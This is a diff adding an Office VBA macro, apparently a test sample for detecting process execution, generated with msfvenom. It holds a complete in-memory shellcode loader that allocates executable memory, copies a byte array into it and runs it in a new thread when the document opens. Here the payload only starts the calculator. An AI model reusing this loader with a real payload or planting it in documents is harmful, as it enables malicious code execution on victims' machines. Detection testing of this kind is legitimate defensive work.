@@ -1,0 +1,37 @@
+# VBA Macro to test process execution 
+# msfvenom --arch x86 --platform windows -p windows/exec CMD=calc.exe -f vba
+
+#If Vba7 Then
+        Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Xnabcz As Long, ByVal Fjxa As Long, ByVal Aiuyzqy As LongPtr, Aeqm As Long, ByVal Jrvdsfetk As Long, Ovrcmosez As Long) As LongPtr
+        Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Hiyuxi As Long, ByVal Zrzeu As Long, ByVal Lvlkfhk As Long, ByVal Uiwoleu As Long) As LongPtr
+        Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Kcgh As LongPtr, ByRef Njvte As Any, ByVal Pow As Long) As LongPtr
+#Else
+        Private Declare Function CreateThread Lib "kernel32" (ByVal Xnabcz As Long, ByVal Fjxa As Long, ByVal Aiuyzqy As Long, Aeqm As Long, ByVal Jrvdsfetk As Long, Ovrcmosez As Long) As Long
+        Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Hiyuxi As Long, ByVal Zrzeu As Long, ByVal Lvlkfhk As Long, ByVal Uiwoleu As Long) As Long
+        Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Kcgh As Long, ByRef Njvte As Any, ByVal Pow As Long) As Long
+#EndIf
+
+Sub Auto_Open()
+        Dim Hpqgzy As Long, Gyc As Variant, Uijgl As Long
+#If Vba7 Then
+        Dim  Wrezd As LongPtr, Lqxeiqdve As LongPtr
+#Else
+        Dim  Wrezd As Long, Lqxeiqdve As Long
+#EndIf
+        Gyc = Array(252,232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,139,114,40,15,183,74,38,49,255,172,60,97,124,2,44,32,193,207,13,1,199,226,242,82,87,139,82,16,139,74,60,139,76,17,120,227,72,1,209,81,139,89,32,1,211,139,73,24,227,58,73,139,52,139,1,214,49,255,172,193, _
+207,13,1,199,56,224,117,246,3,125,248,59,125,36,117,228,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,95,95,90,139,18,235,141,93,106,1,141,133,178,0,0,0,80,104,49,139,111,135,255,213,187,240,181,162,86,104,166,149, _
+189,157,255,213,60,6,124,10,128,251,224,117,5,187,71,19,114,111,106,0,83,255,213,99,97,108,99,46,101,120,101,0)
+
+        Wrezd = VirtualAlloc(0, UBound(Gyc), &H1000, &H40)
+        For Uijgl = LBound(Gyc) To UBound(Gyc)
+                Hpqgzy = Gyc(Uijgl)
+                Lqxeiqdve = RtlMoveMemory(Wrezd + Uijgl, Hpqgzy, 1)
+        Next Uijgl
+        Lqxeiqdve = CreateThread(0, 0, Wrezd, 0, 0, 0)
+End Sub
+Sub AutoOpen()
+        Auto_Open
+End Sub
+Sub Workbook_Open()
+        Auto_Open
+End Sub
